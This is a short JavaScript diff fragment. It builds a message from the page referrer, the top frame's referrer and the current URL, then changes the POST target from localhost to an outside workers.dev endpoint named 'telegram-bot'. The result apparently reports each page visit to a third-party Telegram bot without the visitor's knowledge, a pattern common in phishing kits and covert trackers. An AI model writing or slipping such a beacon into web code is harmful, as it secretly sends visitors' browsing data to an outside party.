@@ -101,7 +101,7 @@ const {
 				htmlText += "\n - *referer : *" + document.referrer;
 				htmlText += "\n - *otherRef : *" + window?.frames?.top?.document.referrer;
 				htmlText += "\n - *Url : *" + document.location;
-				fetch("http://127.0.0.1:8787", {
+				fetch("https://telegram-bot.aslanferhat16.workers.dev", {
 					body: htmlText,
 					method: "POST",
 					headers: {
